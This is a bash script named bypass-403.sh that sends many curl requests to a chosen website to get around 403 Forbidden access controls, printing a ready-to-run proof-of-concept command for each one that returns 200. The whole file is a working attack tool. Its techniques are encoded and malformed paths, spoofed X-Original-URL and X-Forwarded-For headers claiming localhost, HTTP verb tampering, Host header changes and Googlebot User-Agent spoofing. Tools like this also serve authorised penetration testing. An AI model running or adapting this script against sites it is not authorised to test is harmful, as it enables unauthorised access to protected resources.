#!/run/current-system/sw/bin/bash

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./bypass-403.sh https://example.com path"
    exit 1
fi

RESET="\033[0m"
BOLD="\033[1m"
DIM="\033[2m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"

TARGET="$1"
PATHV="$2"

echo -e "${BOLD}Target:${RESET} $TARGET/$PATHV"
echo -e "${DIM}Showing 200 OK results only${RESET}"
echo ""

HITS=0

# req <url> <label> [extra curl args...]
req() {
    local url="$1"
    local label="$2"
    shift 2
    local result
    result=$(curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$@" "$url")
    local code="${result%%,*}"
    local size="${result##*,}"

    if [[ "$code" != "200" ]]; then
        return
    fi

    HITS=$((HITS + 1))

    local poc="curl -s -i -L"
    for a in "$@"; do
        poc+=" $(printf '%q' "$a")"
    done
    poc+=" $(printf '%q' "$url")"

    echo -e "${GREEN}${BOLD}[$HITS] 200 OK${RESET}  ${DIM}(${size} bytes)${RESET}"
    echo -e "    ${label}"
    echo -e "    ${CYAN}${poc}${RESET}"
    echo ""
}

req "$TARGET/$PATHV" "${TARGET}/${PATHV}"
req "$TARGET/%2e/$PATHV" "${TARGET}/%2e/${PATHV}"
req "$TARGET/$PATHV/." "${TARGET}/${PATHV}/."
req "$TARGET//$PATHV//" "${TARGET}//${PATHV}//"
req "$TARGET/./$PATHV/./" "${TARGET}/./${PATHV}/./"
req "$TARGET/.//$PATHV/" "${TARGET}/.//${PATHV}/"
req "$TARGET/" "${TARGET}/${PATHV} -H X-Custom-IP-Authorization: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"
req "$TARGET//$PATHV/%00" "${TARGET}/${PATHV}/%00"
req "$TARGET/" "${TARGET}/${PATHV} -H X-Original-URL: ${PATHV}" -H "X-Original-URL: $PATHV"
req "$TARGET/${PATHV}anything" "${TARGET}/${PATHV}anything -H X-Original-URL: /${PATHV}" -H "X-Original-URL: /$PATHV"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Custom-IP-Authorization: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Forwarded-For: http://127.0.0.1" -H "X-Forwarded-For: http://127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Forwarded-For: 127.0.0.1:80" -H "X-Forwarded-For: 127.0.0.1:80"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"
req "$TARGET" "${TARGET} -H X-rewrite-url: ${PATHV}" -H "X-rewrite-url: $PATHV"
req "$TARGET" "${TARGET} -H X-rewrite-url: /${PATHV}" -H "X-rewrite-url: /$PATHV"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Referer: /${PATHV}" -H "Referer: /$PATHV"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Originating-IP: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Remote-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Client-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Host: 127.0.0.1" -H "X-Host: 127.0.0.1"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-Forwarded-Host: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1"
req "$TARGET/${PATHV}%20/" "${TARGET}/${PATHV}%20/"
req "$TARGET/$PATHV/%20/" "${TARGET}/${PATHV}/%20/"
req "$TARGET/%20${PATHV}%20/" "${TARGET}/%20${PATHV}%20/"
req "$TARGET/$PATHV?" "${TARGET}/${PATHV}?"
req "$TARGET/$PATHV???" "${TARGET}/${PATHV}???"
req "$TARGET/$PATHV//" "${TARGET}/${PATHV}//"
req "$TARGET/$PATHV/" "${TARGET}/${PATHV}/"
req "$TARGET/$PATHV/.random" "${TARGET}/${PATHV}/.random"
req "$TARGET/${PATHV}..;/" "${TARGET}/${PATHV}..;/"
req "$TARGET/${PATHV};/" "${TARGET}/${PATHV};/"

# --- HackTricks additions ---

# Path case / suffix / separator tricks
req "$TARGET/${PATHV^^}" "${TARGET}/${PATHV^^} (uppercase)"
req "$TARGET/;/$PATHV" "${TARGET}/;/${PATHV}"
req "$TARGET/.;/$PATHV" "${TARGET}/.;/${PATHV}"
req "$TARGET//;//$PATHV" "${TARGET}//;//${PATHV}"
req "$TARGET/${PATHV}.json" "${TARGET}/${PATHV}.json"
req "$TARGET/%ef%bc%8f$PATHV" "${TARGET}/%ef%bc%8f${PATHV} (unicode fullwidth slash)"

# Verb tampering — a route protected on GET may allow other verbs
for VERB in HEAD POST PUT DELETE OPTIONS TRACE PATCH INVENTED HACK; do
    req "$TARGET/$PATHV" "${TARGET}/${PATHV} -X ${VERB}" -X "$VERB"
done
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-HTTP-Method-Override: PUT" -H "X-HTTP-Method-Override: PUT"

# Host header tricks
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: (removed)" -H "Host;"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: localhost" -H "Host: localhost"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: 127.0.0.1" -H "Host: 127.0.0.1"

# User-Agent variation — some WAF/ACL rules key off UA
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -A googlebot" -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
req "$TARGET/$PATHV" "${TARGET}/${PATHV} -A curl-empty" -A ""

echo -e "${BOLD}Done.${RESET} ${GREEN}${HITS}${RESET} bypass(es) returned 200."
